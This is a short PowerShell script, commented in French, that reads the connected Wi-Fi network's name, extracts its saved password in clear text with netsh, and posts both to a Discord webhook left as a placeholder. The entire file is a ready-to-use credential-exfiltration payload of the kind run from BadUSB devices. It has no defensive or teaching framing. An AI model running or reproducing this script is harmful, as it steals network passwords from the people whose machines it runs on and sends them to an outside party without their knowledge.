# Récupère le nom du profil du réseau Wi-Fi connecté
$profileName = (netsh wlan show interfaces | Select-String -Pattern "^....SSID" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })

# Obtient le profil Wi-Fi détaillé, y compris le mot de passe
$wifiProfile = netsh wlan show profile name="$profileName" key=clear

# Extrait le mot de passe du profil Wi-Fi
$wifiPassword = $wifiProfile | Select-String -Pattern "Contenu de la cl\u00e9" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }

# Définit l'URL du Webhook Discord
$webhookUrl = "YOUR WEBHOOK HERE"

# Crée le message contenant le nom du profil Wi-Fi et le mot de passe
$message = "SSID: $profileName`nPassword: $wifiPassword"

# Envoie le message au Webhook Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body (ConvertTo-Json -InputObject @{ content = $message })
